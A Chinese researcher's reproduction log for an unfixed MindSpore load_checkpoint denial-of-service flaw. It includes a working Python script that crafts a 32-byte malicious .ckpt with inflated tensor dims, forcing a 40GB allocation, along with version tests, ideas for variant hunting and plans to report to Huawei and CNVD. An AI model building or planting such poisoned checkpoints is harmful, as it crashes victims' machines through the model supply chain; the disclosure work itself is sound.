# MindSpore load_checkpoint DoS 复现（2026-08-07）

> 环境：WSL2，Python 3.10 venv，MindSpore 2.8.0（CPU）
> 复现方式：自构造恶意 .ckpt（未用外部 PoC 文件，原理验证）
> 结果：**32 字节 .ckpt → 尝试分配 40GB（放大 ~12.5 亿倍）** ✅

---

## 一、漏洞概述

- **类型**：CWE-789（不可控内存分配 / 过度大小）
- **入口**：`mindspore.load_checkpoint()` → `train/serialization.py::_load_into_param_dict`
- **根因**：.ckpt protobuf 的 `tensor.dims`（repeated int64）**完全不校验**是否匹配 `tensor_content` 实际大小，直接传给 C++ `Tensor_.convert_bytes_to_tensor(new_data, tuple(dims), ms_type)` 分配内存
- **攻击面**：HuggingFace / ModelScope 投毒模型文件，任何 load_checkpoint 的用户触发（供应链）

## 二、复现

### 构造恶意 .ckpt（32 字节，比原 PoC 44B 更小）

```python
from mindspore.train.checkpoint_pb2 import Checkpoint
msg = Checkpoint()
v = msg.value.add()
v.tag = 'x'
v.tensor.tensor_type = 'Float32'
v.tensor.dims.extend([100000, 100000, 1])    # 1e10 elems × 4B = 40GB
v.tensor.tensor_content = b'\x00\x00\x80\x3f'  # 仅 4 字节真实数据
open('dos_moderate_own.ckpt','wb').write(msg.SerializeToString())
```

### 触发（ulimit -v 8GB 保护下）

```
[WARNING] Try to alloca a large memory, size is:40000000000
[CRITICAL] Failed to load the checkpoint file 'dos_moderate_own.ckpt'.
RuntimeError: Unknown Error!  → 包成 ValueError
```

**证据**：32 字节文件 → `size is:40000000000`（40GB）。放大率 = 40,000,000,000 / 32 ≈ **12.5 亿倍**。

无 ulimit 保护时：40GB 分配在受限环境 SIGABRT 并破坏解释器状态；真实机器上 OOM 整机（原 PoC 文档已证）。

### 触达链路

```
load_checkpoint → _load_into_param_dict
  → element.tensor.dims = [100000,100000,1]   (attacker)
  → Tensor_.convert_bytes_to_tensor(new_data, dims, ms_type)  (C++)
  → tensor_data.h:565 "Try to alloca a large memory" 40GB
```

## 三、为什么是"被认可"目标而不是蓝海

- 这是**已知未修漏洞**（无 CVE 编号）——适合**复现→整理→向华为/CNVD 报告**，走成果出口
- 未修的原因很可能是：华为官方安全团队还没处理，或尚未上报
- 需要确认：**最新版 2.10.0 是否已修**（本次只测了 2.8.0）——若 2.10.0 已修，则报告价值降低；若未修，直接报

## 三.5、⭐ 修复状态确认（08-07）：最新版仍未修

| 版本 | 结果 |
|------|------|
| **2.8.0** | `Try to alloca a large memory, size is:40000000000` → RuntimeError（复现） |
| **2.10.0（最新）** | **同样** `Try to alloca a large memory, size is:40000000000` → RuntimeError（**未修复**） |

**结论：DoS 在最新版 2.10.0 依然存在** → 上报价值高（影响所有用户，官方未处理）。

---

## 四、扩展挖掘方向

1. **同族变体**：`load()` / `load_param_into_net` / `maptensor` 分支 / safetensors 加载路径是否同样不校验 dims
2. **数值型放大**：不只 dims——`tensor_type` 改成 8 字节类型（Float64/Int64）放大率×2
3. **负 dims / 极端值**：dims 含负数 / 极大值 → 溢出 → 可能从 DoS 变成越界读/写
4. **报告流程**：华为 SECURITY.md 有官方渠道；也符合"被认可组件"路线

## 五、产物（本目录）

| 文件 | 说明 |
|------|------|
| `dos_moderate_own.ckpt` | 32 字节恶意 checkpoint |
| `craft_ckpt_own.py` | 构造脚本（可调 dims） |
| `poc_demo_own.py` | 触发脚本（load_checkpoint） |

## 六、CNVD 查证（08-07 深度搜索）

- 本漏洞（dims 内存放大）**无 CNVD/CNNVD/CVE 编号**，只有 HuggingFace 上的外部 PoC
- 唯一 MindSpore CNVD 条目 **CNVD-2024-24257**（2024-06，2.2.13，"逻辑缺陷"）经核查是**不同问题**：补丁 PR 68247 = "[MS][OPS] Fix max/min cpu kernel NaN error"（max/min 算子 NaN），与 checkpoint 加载无关
- 结论：**未进任何官方漏洞库 = 上报 CNVD 是真实空白**（华为是 CNVD 技术组成员，受理确定性强）

## 七、下一步验证

- [x] ~~测 MindSpore 2.10.0（最新）是否已修~~ → **2.10.0 仍未修**
- [x] ~~CNVD 查证~~ → 无编号，CNVD 上报可行
- [ ] 同族变体审计（load/safetensors/maptensor）
- [ ] dims 变体审计（负数/溢出→越界？）
- [ ] **向华为 PSIRT / CNVD 上报**（2.8.0 + 2.10.0 均受影响，实锤）
